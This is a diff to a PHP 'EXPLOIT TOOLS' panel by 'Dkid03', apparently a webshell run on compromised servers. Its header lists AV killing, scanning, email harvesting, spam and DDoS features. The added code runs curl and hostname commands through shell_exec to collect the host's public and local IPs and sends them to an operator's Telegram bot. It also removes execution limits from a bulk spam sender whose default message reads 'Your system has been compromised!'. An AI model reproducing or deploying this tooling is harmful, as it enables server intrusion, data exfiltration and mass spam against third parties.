@@ -1,11 +1,11 @@
 <?php
 // ============================================================
-// EXPLOIT TOOLS - FULL VERSION
+// EXPLOIT TOOLS - FULL VERSION (WITH GET IP)
 // Author: Dkid03
 // Fitur: PHP Settings, Firewall, AV Killer, Network Scan,
 //        Admin Finder, SMB Scan, Wallpaper Changer,
 //        Email Extractor, Spam Sender (PHP Mail),
-//        DDoS, Webshell Scanner, File Manager
+//        DDoS, Webshell Scanner, File Manager, Get IP
 // ============================================================
 session_start();
 error_reporting(E_ALL);
@@ -375,7 +375,7 @@ function send_spam_bulk_php($emails, $subject, $message, $from = '') {
     foreach ($valid_emails as $email) {
         if (send_spam_php_mail($email, $subject, $message, $from)) $sent++;
         else $failed++;
-        usleep(300000);
+        usleep(500000);
     }
     return ['success' => true, 'sent' => $sent, 'failed' => $failed, 'total' => count($valid_emails)];
 }
@@ -478,6 +478,31 @@ function scan_webshell($path = '') {
     }
     usort($found, function($a, $b) { return $b['score'] - $a['score']; });
     return ['success' => true, 'files' => $found, 'total' => count($found)];
+}
+
+// ==================== FITUR 13: GET SERVER IP ====================
+function get_server_ips() {
+    $result = [];
+    // PHP $_SERVER
+    $result['PHP_SERVER_ADDR'] = $_SERVER['SERVER_ADDR'] ?? 'unknown';
+    $result['PHP_HTTP_HOST'] = $_SERVER['HTTP_HOST'] ?? 'unknown';
+    $result['PHP_SERVER_NAME'] = $_SERVER['SERVER_NAME'] ?? 'unknown';
+    $result['REMOTE_ADDR'] = $_SERVER['REMOTE_ADDR'] ?? 'unknown';
+    // gethostbyname
+    $host = $_SERVER['HTTP_HOST'] ?? 'localhost';
+    $result['gethostbyname'] = gethostbyname($host);
+    // DNS
+    $result['dns_get_record'] = @dns_get_record($host, DNS_A)[0]['ip'] ?? 'unknown';
+    // Shell
+    if (isShellAvailable()) {
+        $result['shell_hostname'] = trim(@shell_exec('hostname -I 2>/dev/null'));
+        $result['shell_public'] = trim(@shell_exec('curl -s ifconfig.me 2>/dev/null'));
+        $result['shell_ipinfo'] = trim(@shell_exec('curl -s ipinfo.io/ip 2>/dev/null'));
+        $result['shell_icanhaz'] = trim(@shell_exec('curl -s icanhazip.com 2>/dev/null'));
+        $result['shell_hostname'] = trim(@shell_exec('hostname 2>/dev/null'));
+        $result['shell_uname'] = trim(@shell_exec('uname -n 2>/dev/null'));
+    }
+    return $result;
 }
 
 // ==================== LOGIN ====================
@@ -639,16 +664,32 @@ if (isset($_SESSION['loggedin']) && time() - $_SESSION['login_time'] < SESSION_T
     
     // 9. Spam Sender (PHP Mail)
     if (isset($_GET['send_spam_php'])) {
-        set_time_limit(MAX_EXECUTION_TIME + 120);
+        set_time_limit(0);
+        ini_set('max_execution_time', 0);
         $to = $_GET['to'] ?? '';
         $subject = $_GET['subject'] ?? 'System Alert';
         $msg_content = $_GET['msg'] ?? 'Your system has been compromised! Contact admin immediately.';
         $from = $_GET['from'] ?? 'admin@' . $_SERVER['HTTP_HOST'];
         if (empty($to)) { $msg = "❌ To email required"; } else {
             if (!isMailAvailable()) { $msg = "❌ mail() function tidak tersedia."; } else {
-                $emails = explode(',', $to);
-                $result = send_spam_bulk_php($emails, $subject, $msg_content, $from);
-                if ($result['success']) { $msg = "📨 Spam sent to " . $result['sent'] . " recipients (" . $result['failed'] . " failed)"; } else { $msg = "❌ " . $result['error']; }
+                $emails = array_map('trim', explode(',', $to));
+                $valid_emails = array_filter($emails, function($e) { return filter_var($e, FILTER_VALIDATE_EMAIL); });
+                if (empty($valid_emails)) { $msg = "❌ Tidak ada email valid"; } else {
+                    $sent = 0; $failed = 0; $log = [];
+                    foreach ($valid_emails as $email) {
+                        $log[] = "📤 Mengirim ke $email ...";
+                        $headers = "From: $from\r\nReply-To: $from\r\nX-Mailer: PHP/" . phpversion() . "\r\nMIME-Version: 1.0\r\nContent-Type: text/html; charset=UTF-8\r\n";
+                        if (@mail($email, $subject, $msg_content, $headers)) {
+                            $sent++;
+                            $log[] = "✅ $email SENT";
+                        } else {
+                            $failed++;
+                            $log[] = "❌ $email FAILED";
+                        }
+                        sleep(2);
+                    }
+                    $msg = "📨 Spam Result:\nSent: $sent\nFailed: $failed\nTotal: " . count($valid_emails) . "\n\n📋 Log:\n" . implode("\n", $log);
+                }
             }
         }
         sendTelegramMessage($botToken, $telegramUserId, $msg);
@@ -737,6 +778,20 @@ if (isset($_SESSION['loggedin']) && time() - $_SESSION['login_time'] < SESSION_T
         readfile($file);
         exit;
     }
+    
+    // 16. GET SERVER IP
+    if (isset($_GET['get_ip']) && isset($_SESSION['loggedin']) && $_SESSION['loggedin'] === true) {
+        $ips = get_server_ips();
+        $msg = "🌐 *Server IP Information*\n\n";
+        foreach ($ips as $key => $value) {
+            if (!empty($value) && $value != 'unknown') {
+                $msg .= "📡 $key: $value\n";
+            }
+        }
+        sendTelegramMessage($botToken, $telegramUserId, $msg);
+        echo nl2br($msg);
+        exit;
+    }
 }
 
 // ==================== HTML PANEL ====================
@@ -756,7 +811,7 @@ hr{border-color:#00ff9d22;margin:15px 0;}
 <body>
 <div class="container">
     <h1>🔧 EXPLOIT TOOLS</h1>
-    <p style="color:#6c757d;font-size:0.8rem;">Full Version - PHP Mail</p>
+    <p style="color:#6c757d;font-size:0.8rem;">Full Version - PHP Mail + Get IP</p>
     <?php if ($loginError) echo "<div class='error'>$loginError</div>"; ?>
     <?php if ($loginSuccess) echo "<div class='success'>$loginSuccess</div>"; ?>
     <form method="post"><button type="submit" name="request_otp">📨 Kirim OTP ke Telegram</button></form>
@@ -957,6 +1012,18 @@ td{padding:5px;border-bottom:1px solid #30363d;}
             </table>
         </div>
         <?php endif; endif; ?>
+    </div>
+
+    <!-- 13. Get Server IP -->
+    <div class="card">
+        <h3>🌐 13. GET SERVER IP</h3>
+        <a href="?get_ip=1" class="btn btn-green">🌐 GET IP</a>
+        <div class="small-note">Tampilkan IP server (public & local) via PHP dan shell</div>
+        <?php if (isset($_GET['get_ip'])): 
+            $ips = get_server_ips();
+        ?>
+        <pre><?php foreach ($ips as $key => $value): if (!empty($value) && $value != 'unknown') echo "📡 $key: $value\n"; endforeach; ?></pre>
+        <?php endif; ?>
     </div>
 </div>
 </body></html>
